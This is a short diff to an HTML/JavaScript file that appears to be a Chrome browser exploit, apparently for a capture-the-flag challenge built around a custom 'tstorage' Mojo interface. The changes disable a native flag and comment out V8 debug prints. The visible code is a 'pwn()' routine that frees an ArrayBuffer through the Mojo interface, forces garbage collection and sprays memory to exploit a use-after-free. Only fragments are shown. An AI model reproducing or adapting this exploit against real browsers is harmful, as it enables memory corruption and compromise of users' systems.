@@ -3,7 +3,7 @@
 	<script src="mojojs/mojo_bindings.js"></script>
     <script src="mojojs/third_party/blink/public/mojom/tstorage/tstorage.mojom.js"></script>
 	<script>
-const ENABLE_NATIVE = 1;
+const ENABLE_NATIVE = 0;
 
 function success(msg) {
     console.log("[+] "+msg);
@@ -136,8 +136,8 @@ async function pwn(){
 
 		var uaf = new Float64Array(arry_size).fill(i2f(0x747474747474n));
 		var leaks = new Float64Array(arry_size);
-		%DebugPrint(uaf);
-		%DebugPrint(uaf.buffer);
+		//%DebugPrint(uaf);
+		//%DebugPrint(uaf.buffer);
 		//debug();
 		await free(uaf.buffer);
 		success("free buffers");
@@ -146,10 +146,10 @@ async function pwn(){
 			gc();
 		}
 		success("gc");
-		%DebugPrint(uaf.buffer);
-		%DebugPrint(uaf);
-		%DebugPrint(leaks);
-		%DebugPrint(leaks.buffer);
+		//%DebugPrint(uaf.buffer);
+		//%DebugPrint(uaf);
+		//%DebugPrint(leaks);
+		//%DebugPrint(leaks.buffer);
 		gar = []
 		//debug();
 		for(let i = 0; i < 800000; i++){
